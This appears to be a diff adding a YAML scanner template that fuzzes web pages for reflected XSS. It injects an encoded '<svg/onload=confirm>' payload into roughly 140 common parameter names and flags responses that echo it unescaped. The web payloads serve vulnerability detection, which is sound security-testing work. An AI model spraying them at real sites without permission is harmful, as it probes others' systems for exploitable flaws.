@@ -1,0 +1,58 @@
+id: poc-yaml-fuzz-testing-xss-1
+info:
+  name: 模糊测试1 XSS漏洞
+  severity: medium
+  tags:
+  - xss
+  finger: ''
+variables:
+  payloads: 'u=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-u%27%29%3E&groups=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-groups%27%29%3E&signup_for=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-signup_for%27%29%3E&user_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-user_id%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-type%27%29%3E&desc=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-desc%27%29%3E&newcontent=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-newcontent%27%29%3E&foo=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-foo%27%29%3E&message=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-message%27%29%3E&d=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-d%27%29%3E&width=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-width%27%29%3E&_wp_http_referer=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-_wp_http_referer%27%29%3E&post_status=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_status%27%29%3E&author=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-author%27%29%3E
+
+    send=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-send%27%29%3E&attachment_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-attachment_id%27%29%3E&wp_screen_options=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-wp_screen_options%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-page_id%27%29%3E&locale=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-locale%27%29%3E&function=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-function%27%29%3E&profile=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-profile%27%29%3E&day=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-day%27%29%3E&folder=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-folder%27%29%3E&mobile=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-mobile%27%29%3E&settings=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-settings%27%29%3E&comments=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-comments%27%29%3E&all=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-all%27%29%3E&menu=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-menu%27%29%3E
+
+    uname=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uname%27%29%3E&command=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-command%27%29%3E&reverse=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reverse%27%29%3E&cancel=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cancel%27%29%3E&h=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-h%27%29%3E&logout=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-logout%27%29%3E&section=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-section%27%29%3E&gid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-gid%27%29%3E&input=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-input%27%29%3E&post_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_type%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-page%27%29%3E&updated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-updated%27%29%3E&charset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-charset%27%29%3E&v=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-v%27%29%3E
+
+    t=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-t%27%29%3E&comment=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-comment%27%29%3E&post_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_id%27%29%3E&postid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-postid%27%29%3E&config=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-config%27%29%3E&login=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-login%27%29%3E&paged=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-paged%27%29%3E&go=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-go%27%29%3E&tag_ID=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-tag_ID%27%29%3E&user_login=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-user_login%27%29%3E&part=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-part%27%29%3E&preview_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-preview_id%27%29%3E&_ajax_nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-_ajax_nonce%27%29%3E&widget-id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-widget-id%27%29%3E
+
+    activated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-activated%27%29%3E&trigger=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-trigger%27%29%3E&loggedout=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-loggedout%27%29%3E&script=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-script%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-query%27%29%3E&file_name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-file_name%27%29%3E&fname=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-fname%27%29%3E&options=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-options%27%29%3E&export=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-export%27%29%3E&post=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-p%27%29%3E&action2=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-action2%27%29%3E&c=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-c%27%29%3E&destination=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-destination%27%29%3E
+
+    rememberme=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-rememberme%27%29%3E&module=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-module%27%29%3E&comment_ID=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-comment_ID%27%29%3E&client_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-client_id%27%29%3E&noheader=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-noheader%27%29%3E&del=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-del%27%29%3E&media=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-media%27%29%3E&user_name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-user_name%27%29%3E&country=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-country%27%29%3E&phone=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-phone%27%29%3E&sidebar=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-sidebar%27%29%3E&version=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-version%27%29%3E&widget_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-widget_id%27%29%3E&class=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-class%27%29%3E
+
+    title=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-title%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-view%27%29%3E&context=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-context%27%29%3E&passwd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-passwd%27%29%3E&count=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-count%27%29%3E&delete=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-delete%27%29%3E&test=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-test%27%29%3E&hash=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-hash%27%29%3E&csrf_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-csrf_token%27%29%3E&o=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-o%27%29%3E&activate=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-activate%27%29%3E&edit=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-edit%27%29%3E&ip=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-ip%27%29%3E&r=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-r%27%29%3E
+
+    redirect=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-redirect%27%29%3E&linkcheck=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-linkcheck%27%29%3E&port=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-port%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-password%27%29%3E&target=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-target%27%29%3E&method=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-method%27%29%3E&note=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-note%27%29%3E&amount=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-amount%27%29%3E&set=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-set%27%29%3E&q=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-q%27%29%3E&select=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-select%27%29%3E&cid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cid%27%29%3E&tag=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-tag%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-keyword%27%29%3E
+
+    edit-menu-item=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-edit-menu-item%27%29%3E&error=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-error%27%29%3E&post_title=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_title%27%29%3E&x=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-x%27%29%3E&down=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-down%27%29%3E&state=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-state%27%29%3E&data=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-data%27%29%3E&auth=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-auth%27%29%3E&themes=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-themes%27%29%3E&captcha=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-captcha%27%29%3E&nickname=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nickname%27%29%3E&allusers=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-allusers%27%29%3E&color=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-color%27%29%3E&path=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-path%27%29%3E
+
+    next=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-next%27%29%3E&preview=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-preview%27%29%3E&shortcode=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-shortcode%27%29%3E&features=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-features%27%29%3E&mode=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-mode%27%29%3E&out_trade_no=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-out_trade_no%27%29%3E&category=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-category%27%29%3E&replytocom=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-replytocom%27%29%3E&from=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-from%27%29%3E&start=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-start%27%29%3E&value=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-value%27%29%3E&range=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-range%27%29%3E&table=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-table%27%29%3E&limit=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-limit%27%29%3E
+
+    '
+firstRequest:
+  method: GET
+  path: /
+  expression: '(status_code == 200 || status_code == 500) &&
+
+    contains(headers,"text/html")
+
+    '
+requests:
+- method: GET
+  path: /?{{.payloads}}
+  expression: '(status_code == 200 || status_code == 500) &&
+
+    contains(body,"''>\"<svg/onload=confirm(''xss-") &&
+
+    contains(headers,"text/html") &&
+
+    (
+
+    !contains(body,"<title>Access Denied</title>")
+
+    ||
+
+    !contains(body,"You don''t have permission to access")
+
+    )
+
+    '
+transport: http
